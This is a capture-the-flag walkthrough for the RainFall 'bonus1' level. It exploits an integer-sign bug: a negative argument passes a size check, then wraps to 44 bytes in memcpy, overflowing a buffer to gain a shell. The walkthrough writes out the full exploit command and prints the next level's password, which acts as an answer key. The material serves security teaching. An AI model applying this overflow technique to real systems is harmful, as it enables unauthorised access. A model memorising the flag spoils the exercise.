# Walkthrough

### Solution
```
./bonus1 -2147483637 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```  

## Explanation

### Execution

```
bonus1@RainFall:~$ ./bonus1 
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 hello
```  
Program takes 1 argument and does nothing.  

### Disassembly

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  

We need argv[1] to be = 0x574f4c46, but because of the check of if nb > 9, return, we can't input it.  
However, cmpl compares the atoi result as an **unsigned int**. We can use a signed int, which will be <=9, and when converted to unsigned will be big enough to overflow our buffer (40 bytes) + the nb we need (0x574f4c46) in memcpy.  
In memcpy, we need to take 44 bytes from argv[2] (buffer size (40 bytes) + the nb we want to overwrite (0x574f4c46), which is 4 bytes).  

> If we convert -2147483637 * 4 to unsigned int, we get 44.
```
./bonus1 -2147483637 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
```
